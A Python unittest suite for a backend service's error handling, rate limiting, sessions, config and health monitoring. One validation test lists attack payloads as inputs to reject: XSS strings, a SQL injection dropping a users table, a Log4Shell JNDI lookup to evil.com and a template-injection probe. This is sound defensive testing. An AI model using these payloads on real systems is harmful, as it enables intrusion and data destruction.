"""
Comprehensive Error Testing Suite
Tests all edge cases and failure scenarios
"""

import asyncio
import json
import os
import tempfile
import time
import unittest
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional
from unittest.mock import AsyncMock, Mock, patch

import pytest
from concurrent_processor import ConcurrentProcessor, RequestPriority
from error_handling import CircuitBreaker, ErrorHandler, RetryPolicy
from health_monitor import HealthMonitor, HealthStatus
from metrics import CostCalculation, MetricsCollector, TokenUsage
from rate_limiter import RateLimitConfig, RateLimiter, RateLimitExceeded
from resource_manager import ResourceManager, ResourceTracker
from session_manager import SessionData, SessionManager

# Import the modules we're testing
from validation import ProcessingRequest, UserContext, UserRole, validator

from ..config_manager import ConfigManager, ConfigValidationError


class TestValidationEdgeCases(unittest.TestCase):
    """Test input validation edge cases"""

    def test_empty_request(self):
        """Test empty request validation"""
        with self.assertRaises(Exception):
            validator.validate_request({"request": ""})

    def test_extremely_long_request(self):
        """Test extremely long request"""
        long_text = "a" * 100001  # Over 100KB limit
        result = validator.validate_request({"request": long_text})
        self.assertFalse(result.is_valid)
        self.assertIn("too long", " ".join(result.errors))

    def test_malicious_content(self):
        """Test malicious content detection"""
        malicious_requests = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "'; DROP TABLE users; --",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<img src=x onerror=alert('xss')>",
        ]

        for malicious_request in malicious_requests:
            result = validator.validate_request({"request": malicious_request})
            # Should either be rejected or sanitized
            self.assertTrue(
                not result.is_valid or "<script>" not in str(result.sanitized_data)
            )

    def test_unicode_edge_cases(self):
        """Test Unicode edge cases"""
        unicode_requests = [
            "🚀🔥💯",  # Emojis
            "ñáéíóú",  # Accented characters
            "العربية",  # Arabic
            "中文",  # Chinese
            "עברית",  # Hebrew
            "\u0000\u0001\u0002",  # Control characters
            "\uFEFF",  # BOM
        ]

        for unicode_request in unicode_requests:
            result = validator.validate_request({"request": unicode_request})
            # Should handle Unicode gracefully
            self.assertIsNotNone(result)

    def test_invalid_user_context(self):
        """Test invalid user context"""
        invalid_contexts = [
            {"user_id": ""},  # Empty user ID
            {"user_id": "a" * 101},  # Too long user ID
            {"user_id": "valid", "user_role": "invalid_role"},  # Invalid role
            {"user_id": "valid", "email": "invalid-email"},  # Invalid email
        ]

        for context in invalid_contexts:
            request_data = {
                "request": "test",
                "session_id": "test",
                "workspace_id": "test",
                "user_context": context,
            }
            result = validator.validate_request(request_data)
            self.assertFalse(result.is_valid)


class TestErrorHandlingEdgeCases(unittest.TestCase):
    """Test error handling edge cases"""

    def test_circuit_breaker_timeout(self):
        """Test circuit breaker timeout behavior"""
        breaker = CircuitBreaker(failure_threshold=2, recovery_timeout=1)

        @breaker
        async def failing_function():
            raise Exception("Always fails")

        async def run_test():
            # Trigger failures
            for _ in range(3):
                try:
                    await failing_function()
                except Exception:
                    pass

            # Should be open now
            with self.assertRaises(Exception):
                await failing_function()

            # Wait for recovery
            await asyncio.sleep(1.1)

            # Should work again
            try:
                await failing_function()
            except Exception:
                pass  # Expected to fail again

        asyncio.run(run_test())

    def test_retry_policy_exhaustion(self):
        """Test retry policy exhaustion"""
        retry = RetryPolicy(max_attempts=3, base_delay=0.1)

        call_count = 0

        @retry
        async def sometimes_fails():
            nonlocal call_count
            call_count += 1
            if call_count < 3:
                raise Exception("Not ready yet")
            return "success"

        async def run_test():
            result = await sometimes_fails()
            self.assertEqual(result, "success")
            self.assertEqual(call_count, 3)

        asyncio.run(run_test())

    def test_error_handler_metrics(self):
        """Test error handler metrics collection"""
        handler = ErrorHandler()

        # Simulate errors
        handler.handle_error(Exception("Test error"), "test_phase", "req123")
        handler.handle_error(ValueError("Another error"), "test_phase", "req456")

        summary = handler.get_error_summary()
        self.assertEqual(summary["total_errors"], 2)
        self.assertIn("Exception", summary["errors_by_type"])
        self.assertIn("ValueError", summary["errors_by_type"])


class TestRateLimitingEdgeCases(unittest.TestCase):
    """Test rate limiting edge cases"""

    def test_burst_requests(self):
        """Test burst request handling"""
        config = RateLimitConfig(requests_per_minute=5, burst_size=3)
        limiter = RateLimiter(config)

        async def run_test():
            # Send burst requests
            allowed_count = 0
            for i in range(10):
                allowed, retry_after = await limiter.check_rate_limit(f"user_{i}")
                if allowed:
                    allowed_count += 1

            # Should allow burst_size requests
            self.assertEqual(allowed_count, 3)

        asyncio.run(run_test())

    def test_different_user_tiers(self):
        """Test different user tier limits"""
        config = RateLimitConfig()
        limiter = RateLimiter(config)

        async def run_test():
            # Free user
            allowed, _ = await limiter.check_rate_limit("free_user", "free")
            self.assertTrue(allowed)

            # Premium user should have higher limits
            for i in range(25):  # More than free tier limit
                allowed, _ = await limiter.check_rate_limit("premium_user", "premium")
                if not allowed:
                    break

            # Premium should allow more requests
            self.assertTrue(i > 20)  # Should handle more than free tier

        asyncio.run(run_test())

    def test_rate_limit_recovery(self):
        """Test rate limit recovery after timeout"""
        config = RateLimitConfig(requests_per_minute=2, burst_size=2)
        limiter = RateLimiter(config)

        async def run_test():
            # Exhaust limit
            for i in range(3):
                allowed, retry_after = await limiter.check_rate_limit("user1")
                if not allowed:
                    break

            # Should be rate limited
            self.assertFalse(allowed)
            self.assertIsNotNone(retry_after)

            # Wait for recovery
            await asyncio.sleep(retry_after + 0.1)

            # Should work again
            allowed, _ = await limiter.check_rate_limit("user1")
            self.assertTrue(allowed)

        asyncio.run(run_test())


class TestMetricsEdgeCases(unittest.TestCase):
    """Test metrics collection edge cases"""

    def test_large_token_counts(self):
        """Test handling of large token counts"""
        collector = MetricsCollector()

        async def run_test():
            # Track request with huge token count
            await collector.track_request(
                request_id="test1",
                session_id="session1",
                workspace_id="ws1",
                user_id="user1",
                phase="test",
                provider="openai",
                model="gpt-4",
                input_text="test",
                output_text="test" * 100000,  # Large output
                processing_time_ms=1000,
                success=True,
            )

            # Should handle gracefully
            summary = collector.get_cost_summary()
            self.assertGreater(summary["total_tokens"], 0)

        asyncio.run(run_test())

    def test_concurrent_metrics_tracking(self):
        """Test concurrent metrics tracking"""
        collector = MetricsCollector()

        async def run_test():
            # Track multiple requests concurrently
            tasks = []
            for i in range(10):
                task = collector.track_request(
                    request_id=f"test_{i}",
                    session_id="session1",
                    workspace_id="ws1",
                    user_id="user1",
                    phase="test",
                    provider="openai",
                    model="gpt-4",
                    input_text=f"test {i}",
                    processing_time_ms=100,
                    success=True,
                )
                tasks.append(task)

            await asyncio.gather(*tasks)

            # All metrics should be recorded
            summary = collector.get_cost_summary()
            self.assertEqual(summary["total_requests"], 10)

        asyncio.run(run_test())


class TestResourceManagerEdgeCases(unittest.TestCase):
    """Test resource manager edge cases"""

    def test_memory_leak_detection(self):
        """Test memory leak detection"""
        tracker = ResourceTracker()

        # Simulate increasing memory usage
        for i in range(5):
            metrics = tracker.get_current_metrics()
            # Mock increasing memory
            metrics.memory_mb = 100 + i * 100
            tracker.metrics_history.append(metrics)

        # Should detect leak
        self.assertTrue(tracker.is_memory_leak_detected(threshold_mb_per_minute=50))

    def test_resource_cleanup_on_shutdown(self):
        """Test resource cleanup on shutdown"""
        manager = ResourceManager()

        async def run_test():
            await manager.start()

            # Register some resources
            manager.register_session("test_session")
            manager.register_task(asyncio.create_task(asyncio.sleep(1)))

            # Shutdown should clean up
            await manager.shutdown()

            # Resources should be cleaned
            self.assertEqual(len(manager.active_sessions), 0)

        asyncio.run(run_test())


class TestSessionManagerEdgeCases(unittest.TestCase):
    """Test session manager edge cases"""

    def test_session_expiry(self):
        """Test session expiry handling"""
        storage = Mock()
        cache = Mock()

        async def mock_get(key):
            if key == "session:expired":
                return None
            return {"session_id": key, "data": "test"}

        cache.get = mock_get

        manager = SessionManager(storage, cache, default_ttl_hours=1)

        async def run_test():
            # Expired session should return None
            session = await manager.get_session("expired")
            self.assertIsNone(session)

            # Valid session should return data
            session = await manager.get_session("valid")
            self.assertIsNotNone(session)

        asyncio.run(run_test())

    def test_concurrent_session_updates(self):
        """Test concurrent session updates"""
        storage = Mock()
        cache = Mock()

        manager = SessionManager(storage, cache)

        async def run_test():
            # Create session
            session = await manager.create_session("test", "user1", "ws1")

            # Update concurrently
            tasks = []
            for i in range(5):
                task = manager.update_session("test", {"counter": i})
                tasks.append(task)

            await asyncio.gather(*tasks)

            # Should handle gracefully
            updated_session = await manager.get_session("test")
            self.assertIsNotNone(updated_session)

        asyncio.run(run_test())


class TestConfigManagerEdgeCases(unittest.TestCase):
    """Test configuration manager edge cases"""

    def test_invalid_config_file(self):
        """Test invalid configuration file handling"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as f:
            f.write("invalid: yaml: content: [")
            f.flush()

            try:
                manager = ConfigManager()
                manager.config_file = f.name

                async def run_test():
                    # Should handle invalid YAML gracefully
                    with self.assertRaises(Exception):
                        await manager.load_config()

                asyncio.run(run_test())
            finally:
                os.unlink(f.name)

    def test_missing_required_fields(self):
        """Test missing required configuration fields"""
        manager = ConfigManager()

        config_dict = {
            "database": {
                # Missing required 'host' field
                "port": 5432
            }
        }

        with self.assertRaises(ConfigValidationError):
            manager._validate_config(config_dict)

    def test_environment_variable_override(self):
        """Test environment variable overrides"""
        os.environ["RAPTORFLOW_DEBUG"] = "true"
        os.environ["DATABASE_HOST"] = "test-host"

        try:
            manager = ConfigManager()
            config_dict = {
                "debug": False,
                "database": {"host": "localhost", "port": 5432},
            }

            # Apply env overrides
            overridden = manager._apply_env_overrides(config_dict)

            self.assertTrue(overridden["debug"])
            self.assertEqual(overridden["database"]["host"], "test-host")
        finally:
            os.environ.pop("RAPTORFLOW_DEBUG", None)
            os.environ.pop("DATABASE_HOST", None)


class TestConcurrentProcessorEdgeCases(unittest.TestCase):
    """Test concurrent processor edge cases"""

    def test_queue_overflow(self):
        """Test queue overflow handling"""
        processor = ConcurrentProcessor(max_queue_size=2)

        async def run_test():
            # Fill queue
            requests = []
            for i in range(3):
                try:
                    request_id = await processor.submit_request(
                        ProcessingRequest(
                            request=f"test {i}",
                            session_id="test",
                            workspace_id="test",
                            user_context=UserContext(
                                user_id="test", workspace_id="test"
                            ),
                        )
                    )
                    requests.append(request_id)
                except Exception as e:
                    self.assertIn("full", str(e))
                    break

        asyncio.run(run_test())

    def test_request_cancellation(self):
        """Test request cancellation"""
        processor = ConcurrentProcessor()

        async def run_test():
            # Submit long-running request
            request_id = await processor.submit_request(
                ProcessingRequest(
                    request="test",
                    session_id="test",
                    workspace_id="test",
                    user_context=UserContext(user_id="test", workspace_id="test"),
                )
            )

            # Cancel immediately
            cancelled = await processor.cancel_request(request_id)
            self.assertTrue(cancelled)

        asyncio.run(run_test())


class TestHealthMonitorEdgeCases(unittest.TestCase):
    """Test health monitor edge cases"""

    def test_health_check_timeout(self):
        """Test health check timeout handling"""
        monitor = HealthMonitor(datetime.now())

        async def slow_check():
            await asyncio.sleep(2)
            return {"status": "healthy"}

        monitor.register_checker("slow", slow_check, timeout=0.1)

        async def run_test():
            report = await monitor.run_all_checks()

            # Should find unhealthy check
            slow_check_result = next(
                (c for c in report.checks if c.name == "slow"), None
            )
            self.assertIsNotNone(slow_check_result)
            self.assertEqual(slow_check_result.status, HealthStatus.UNHEALTHY)
            self.assertIn("timed out", slow_check_result.message)

        asyncio.run(run_test())

    def test_consecutive_failure_alerting(self):
        """Test consecutive failure alerting"""
        monitor = HealthMonitor(datetime.now())

        call_count = 0

        async def failing_check():
            nonlocal call_count
            call_count += 1
            if call_count < 3:
                return {"status": "unhealthy", "message": "Consistently failing"}
            return {"status": "healthy", "message": "Recovered"}

        monitor.register_checker("failing", failing_check)

        async def run_test():
            # Run checks multiple times
            for _ in range(4):
                await monitor.run_all_checks()
                await asyncio.sleep(0.1)

            # Should have generated alert after 3 failures
            alerts = [a for a in monitor.alerts if not a.resolved]
            self.assertGreater(len(alerts), 0)

        asyncio.run(run_test())


# Integration test class
class TestIntegrationEdgeCases(unittest.TestCase):
    """Integration tests for edge cases"""

    def test_full_pipeline_with_errors(self):
        """Test full pipeline with various errors"""

        async def run_test():
            # Initialize components
            error_handler = ErrorHandler()
            rate_limiter = RateLimiter(RateLimitConfig())
            metrics_collector = MetricsCollector()

            # Simulate problematic request
            try:
                # Rate limit check
                allowed, _ = await rate_limiter.check_rate_limit("test_user")
                if not allowed:
                    raise RateLimitExceeded("Rate limited")

                # Simulate processing error
                raise Exception("Processing failed")

            except Exception as e:
                # Handle error
                error_response = error_handler.handle_error(e, "processing", "req123")

                # Track error metrics
                await metrics_collector.track_request(
                    request_id="req123",
                    session_id="session1",
                    workspace_id="ws1",
                    user_id="user1",
                    phase="processing",
                    provider="openai",
                    model="gpt-4",
                    input_text="test",
                    processing_time_ms=100,
                    success=False,
                    error_message=str(e),
                )

                # Verify error handling
                self.assertIsNotNone(error_response)
                self.assertIn("error", error_response)

        asyncio.run(run_test())

    def test_system_under_load(self):
        """Test system behavior under load"""

        async def run_test():
            processor = ConcurrentProcessor(max_concurrent_requests=5)

            # Submit many requests
            tasks = []
            for i in range(20):
                try:
                    request_id = await processor.submit_request(
                        ProcessingRequest(
                            request=f"load test {i}",
                            session_id=f"session_{i % 5}",
                            workspace_id="ws1",
                            user_context=UserContext(
                                user_id="test", workspace_id="test"
                            ),
                        ),
                        priority=RequestPriority.NORMAL,
                    )

                    # Get result with timeout
                    result_task = processor.get_result(request_id, timeout=5.0)
                    tasks.append(result_task)

                except Exception as e:
                    # Some requests might fail due to queue limits
                    pass

            # Wait for results
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # Most should succeed
            successful = sum(
                1 for r in results if isinstance(r, ProcessingResult) and r.success
            )
            self.assertGreater(successful, 10)  # At least half should succeed

        asyncio.run(run_test())


if __name__ == "__main__":
    # Run all tests
    unittest.main(verbosity=2)
